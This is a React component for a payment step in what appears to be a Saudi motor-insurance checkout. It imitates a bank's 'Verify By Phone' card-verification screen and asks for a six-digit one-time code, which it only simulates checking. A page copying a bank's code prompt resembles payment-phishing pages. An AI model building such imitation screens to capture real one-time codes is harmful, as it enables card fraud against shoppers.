import { useState } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";
import Footer from "@/components/Footer";

const OtpVerification = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  
  const companyName = searchParams.get("company") || "";
  const price = searchParams.get("price") || "0";
  const cardLast4 = searchParams.get("cardLast4") || "";

  const [otp, setOtp] = useState("");
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (otp.length !== 6) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال رمز التحقق المكون من 6 أرقام",
        variant: "destructive",
      });
      return;
    }

    setIsLoading(true);
    
    // Simulate OTP verification
    setTimeout(() => {
      setIsLoading(false);
      toast({
        title: "تم التحقق بنجاح",
        description: "تم إتمام عملية الدفع بنجاح",
      });
      // Here you would navigate to a success page
      // navigate("/payment-success");
    }, 1500);
  };

  const handleResendCode = () => {
    toast({
      title: "تم إعادة الإرسال",
      description: "تم إرسال رمز تحقق جديد إلى هاتفك",
    });
  };

  return (
    <div className="min-h-screen bg-background flex flex-col">
      {/* Header */}
      <div className="border-b border-border py-4 px-6">
        <div className="max-w-4xl mx-auto flex items-center justify-between">
          <div className="flex gap-2">
            <Button
              variant="ghost"
              onClick={() => navigate(-1)}
              className="text-sm hover:bg-muted"
            >
              Cancel
            </Button>
            <Button
              variant="default"
              className="text-sm bg-blue-700 hover:bg-blue-800 text-white"
            >
              SECURE
            </Button>
          </div>
          <div className="flex items-center gap-2">
            <img src="/placeholder.svg" alt="Secure" className="h-6" />
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="flex-1 flex items-center justify-center px-4 py-12">
        <div className="w-full max-w-md">
          <h1 className="text-2xl font-bold text-center text-foreground mb-6">
            Verify By Phone
          </h1>
          
          <p className="text-center text-muted-foreground mb-6 text-sm leading-relaxed">
            We have sent you a text message with a code to your registered mobile number.
          </p>

          <div className="text-center text-sm text-muted-foreground mb-8 leading-relaxed">
            <p>
              You are paying the amount of{" "}
              <span className="text-foreground">
                {companyName} - تأمين على المركبات ضد الغير
              </span>
            </p>
            <p className="mt-2">
              <span className="font-semibold text-foreground">SAR {price}</span> on{" "}
              {new Date().toLocaleString('en-GB', { 
                day: '2-digit', 
                month: '2-digit', 
                year: 'numeric',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                hour12: false
              })}
            </p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="space-y-2">
              <label className="block text-sm font-medium text-foreground text-right">
                Verification code
              </label>
              <Input
                type="text"
                maxLength={6}
                value={otp}
                onChange={(e) => setOtp(e.target.value.replace(/\D/g, ''))}
                className="w-full h-12 text-center text-lg tracking-widest"
                placeholder=""
              />
            </div>

            <Button
              type="submit"
              className="w-full h-12 text-base bg-blue-500 hover:bg-blue-600 text-white"
              disabled={isLoading || otp.length !== 6}
            >
              {isLoading ? "جاري التحقق..." : "CONFIRM"}
            </Button>

            <div className="text-center">
              <button
                type="button"
                onClick={handleResendCode}
                className="text-blue-600 hover:text-blue-700 font-medium text-sm underline"
              >
                RESEND CODE
              </button>
            </div>
          </form>

          <div className="mt-8 pt-6 space-y-3">
            <button className="w-full text-center text-sm text-blue-600 hover:text-blue-700 flex items-center justify-center gap-2">
              <span>+</span>
              <span>Learn more about authentication</span>
            </button>
            <button className="w-full text-center text-sm text-blue-600 hover:text-blue-700 flex items-center justify-center gap-2">
              <span>+</span>
              <span>Need some help ?</span>
            </button>
          </div>
        </div>
      </div>

      <Footer />
    </div>
  );
};

export default OtpVerification;
